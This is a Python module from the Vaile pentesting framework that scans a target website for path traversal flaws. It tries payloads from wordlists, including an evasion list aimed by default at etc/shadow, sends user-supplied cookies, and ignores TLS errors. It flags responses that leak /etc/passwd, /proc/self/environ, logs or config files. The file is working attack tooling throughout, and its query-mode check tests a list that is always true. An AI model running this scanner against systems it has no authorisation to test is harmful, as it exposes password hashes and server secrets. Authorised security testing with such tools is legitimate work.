#!/usr/bin/env python3
# coding:  utf-8

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    Vaile Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#Author: @_tID
#This module requires Vaile Framework
#https://github.com/VainlyStrain/Vaile


import os
import re
import sys
import urllib
import requests
import time
from core.Core.colors import *
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

global active0
loggy = []
enviro = []
fud = []
generic = []
cnfy = []
gotcha = []
active0 = False

query = [False]
siteinput = [""]
sitecontent = [None]

info = "This module tries to find path traversal vulnerabilities on the target webpage. It is capable of in-path, as well as query attacks, and features two modes: a simple mode, recovering all possible paths, and a powerful evasion engine, attacking a specific path. Also, the user can provide cookies and his own dictionary."
searchinfo = "Path Traversal Finder"
properties = {}

def check0x00(website0, gen_headers):
    #print(query)
    #print(siteinput)
    ev = input(O+"\n [?] Perform Evasion Attack? (specific file ; enter for no) :> ")
    evasion = ev != ""
    if not evasion:
        print(O+' [!] Enter the filename containing paths '+R+'(Default: files/pathtrav_paths.lst)')
        fi = input(O+" [*] Custom filepath (press Enter for default) :> ")
        if fi == '':
            print(GR+' [*] Using default filepath...')
            fi = getFile0x00('files/fuzz-db/pathtrav_paths.lst')
        else:
            fi = getFile0x00(fi)
    else:
        fi = getFile0x00('files/fuzz-db/pathtrav_evasion.lst')
        filepath = input(" [!] Enter file and path to search (Default: etc/shadow) :> ")

    if(active0 is False):
        owebsite = website0
    else:
        owebsite = ahurl

    print("")
    for line in open(fi):
        c = line.strip('\n')
        if evasion and filepath != "":
            c = c.replace("etc/shadow", filepath)
        if not c.startswith('/'):
            website = owebsite + '/' + c
        else:
            website = owebsite + c
        status_code = 500
        print(B+' [+] Testing Url : '+C+website)
        req = requests.get(website, headers=gen_headers, allow_redirects=False, timeout=7, verify=False)
        content = str(req.content)

        if str(req.status_code).startswith('2') or req.status_code == 302:
            # same stuff as in _lfi module
            if ("[<a href='function.main'>function.main</a>" not in content
                    and "[<a href='function.include'>function.include</a>" not in content
                    and ("Failed opening" not in content and "for inclusion" not in content)
                    and "failed to open stream:" not in content
                    and "open_basedir restriction in effect" not in content
                    and ("root:" in content or ("sbin" in content and "nologin" in content)
                or "DB_NAME" in content or "daemon:" in content or "DOCUMENT_ROOT=" in content or 'root:x:' in content
                or "PATH=" in content or "HTTP_USER_AGENT" in content or "HTTP_ACCEPT_ENCODING=" in content
                or "users:x" in content or ("GET /" in content and ("HTTP/1.1" in content or "HTTP/1.0" in content))
                or "apache_port=" in content or "cpanel/logs/access" in content or "allow_login_autocomplete" in content
                or "database_prefix=" in content or "emailusersbandwidth" in content or "adminuser=" in content
                or 'daemon:x:' in content or 'bin:x:' in content or 'mail:x:' in content or 'user:x:' in content
                or ("error]" in content and "[client" in content and "log" in website)
                or ("[error] [client" in content and "File does not exist:" in content and "proc/self/fd/" in website)
                or ("State: R (running)" in content and ("Tgid:" in content or "TracerPid:" in content or "Uid:" in content)
                    and "/proc/self/status" in website))):
                print(G+" [+] '{}' ".format(str(website))+O+"[Vulnerable]")
                website = str(website)
                gotcha.append(website)

                if("log" in website):
                    loggy.append(website)
                elif("/proc/self/environ" in website):
                    enviro.append(website)
                elif("/proc/self/fd" in website):
                    fud.append(website)
                elif(".cnf" in website or ".conf" in website or ".ini" in website):
                    cnfy.append(website)
                else:
                    generic.append(website)
            elif query:
                #print("query, {}, {}".format(siteinput[0], website))
                origrq = requests.get(siteinput[0])
                con2 = origrq.content
                con = req.content
                #print("{}\n\n\n {}".format(content,con2))
                if con != con2:
                    print(G+" [+] '{}' ".format(str(website))+O+"[Vulnerable]")

                    website = str(website)
                    gotcha.append(website)

                    if("log" in website):
                        loggy.append(website)
                    elif("/proc/self/environ" in website):
                        enviro.append(website)
                    elif("/proc/self/fd" in website):
                        fud.append(website)
                    elif(".cnf" in website or ".conf" in website or ".ini" in website):
                        cnfy.append(website)
                    else:
                        generic.append(website)
                else:
                    print(R+" [-] '"+str(website)+"'"+O+" [Not vulnerable]")
            else:
                print(R+" [-] '"+str(website)+"'"+O+" [Not vulnerable]")
        elif req.status_code == 404:
            pass
        elif req.status_code == 403:
            print(G+" [+] '{}' ".format(str(website))+O+"[Vulnerable]")
        elif req.status_code == 401:
            print(R+" [-] Missing authentication.\n")
        else:
            print(R+" [-] Problem connecting to the website...\n")
            
    print(G+"\n [+] Retrieved %s interesting paths...\n" % str(len(gotcha)))
    time.sleep(0.5)

    printOut0x00("Logs",loggy)
    printOut0x00("/proc/self/environ",enviro)
    printOut0x00("/proc/self/fd",fud)
    printOut0x00("Configuration", cnfy)
    printOut0x00("Generic",generic)

def printOut0x00(pathlist,stack):

    print(" %s: [%s]" %(pathlist,len(stack)))
    print('')
    print(O+' [*] Displaying paths obtained...\n')
    for path in stack:
        print(G+' [+] Path :> ' + str(path))
    print("")

def getFile0x00(filename):

    while True:
        if(filename[0] == '\''):
            filename = filename[1:]
        if(filename[len(filename)-1] == '\''):
            filename = filename[:-1]
        if(os.path.exists(filename)):
            return filename
        print(R+" [-] Cannot find '%s'!" % filename)
        filename = input(O+' [*] File containing paths :> ')

def pathtrav(web):

    #global gotcha
    print(GR+' [*] Loading module...')
    time.sleep(0.5)
    print(R+'\n     ================================================')
    print(R+'      P A T H   T R A V E R S A L  (Sensitive Paths)')
    print(R+'     ================================================\n')
    try:
        print(GR+' [!] Input the directory to be used... Final Url will be like '+O+'"http://site.com/sensitive"')
        param = input(O+' [#] Enter directory asssociated (eg. /sensitive) [Enter for None] :> ')
        input_cookie = input("\n [#] Got cookies? [Enter if none] :> ")
        global gen_headers
        gen_headers =    {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201',
                          'Accept-Language':'en-US;',
                          'Accept-Encoding': 'gzip, deflate',
                          'Accept': 'text/html,application/xhtml+xml,application/xml;',
                          'Connection':'close'}
        if(len(input_cookie) > 0):
            gen_headers['Cookie'] = input_cookie
            #gen_headers['Cookie'] = "security=low; PHPSESSID=n3o05a33llklde1r2upt98r1k2"
        if param.startswith('/'):
            web00 = web + param
        elif param == '':
            web00 = web + param
        else:
            web00 = web + '/' + param
        input_query = input("\n [#] Query Attack? [Enter if not] :> ")
        #print(input_query)
        if input_query != "":
            query[0] = True
            param = input(" [#] Enter parameter :> ")
            web00 = web00 + "?" + param + "="
        siteinput[0] = web00
        check0x00(web00, gen_headers)

    except KeyboardInterrupt:
        print(R+' [-] User Interruption!')
        return

    except Exception as e:
        print(R+' [-] Exception encountered during processing...')
        print(R+' [-] Error : '+str(e))

def attack(web):
    pathtrav(web)